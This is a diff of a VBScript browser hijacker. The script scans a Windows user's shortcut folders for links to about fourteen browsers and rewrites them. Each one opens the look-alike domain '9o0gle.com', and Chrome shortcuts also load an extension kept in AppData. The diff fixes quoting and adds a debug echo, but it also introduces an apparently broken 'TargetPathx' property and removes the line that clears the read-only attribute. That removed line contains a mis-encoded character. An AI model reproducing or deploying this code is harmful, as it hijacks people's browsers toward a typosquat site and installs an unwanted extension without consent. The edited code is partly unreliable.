@@ -1,6 +1,6 @@
 Dim objFS:Set objFS = CreateObject("Scripting.FileSystemObject")
 On Error Resume Next
-Const link = http://9o0gle.com/
+Const link = "http://9o0gle.com/"
 Const linkChrome = " --load-extension=""C:\Users\{username}1\AppData\Local\kemgadeojglibflomicgnfeopkdfflnk"" http://9o0gle.com/"
 browsers = Array("IEXPLORE.EXE", "firefox.exe", "360SE.exe", "SogouExplorer.exe", "opera.exe", "Safari.exe", "Maxthon.exe", "TTraveler.exe", "TheWorld.exe", "baidubrowser.exe", "liebao.exe", "QQBrowser.exe","chrome.exe","360chrome.exe")
 ChromeBrowsers = Array("chrome.exe","360chrome.exe")
@@ -26,12 +26,14 @@ FoldersDic(8) = "C:\Users\{username}\AppData\Roaming"
 FoldersDic(9) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch"
 FoldersDic(10) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu"
 FoldersDic(11) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
+
 Set fso = CreateObject("Scripting.Filesystemobject")
 For i = 0 To UBound(FoldersDic)
   For Each file In fso.GetFolder(FoldersDic(i)).Files
     If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
+      WScript.Echo(file)
       set oShellLink = WshShell.CreateShortcut(file.Path)
-      path = oShellLink.TargetPath
+      path = oShellLink.TargetPathx
       name = fso.GetBaseName(path) & "." & fso.GetExtensionName(path)
       If BrowserDic.Exists(LCase(name)) Then
         If ChromeBrowserDic.Exists(LCase(name)) Then
@@ -40,7 +42,7 @@ For i = 0 To UBound(FoldersDic)
           oShellLink.Arguments = link
         End if
         If file.Attributes And 1 Then
-          file.Attributes = file.Attributes ¨C 1
+          
         End If
         oShellLink.Save
       End If
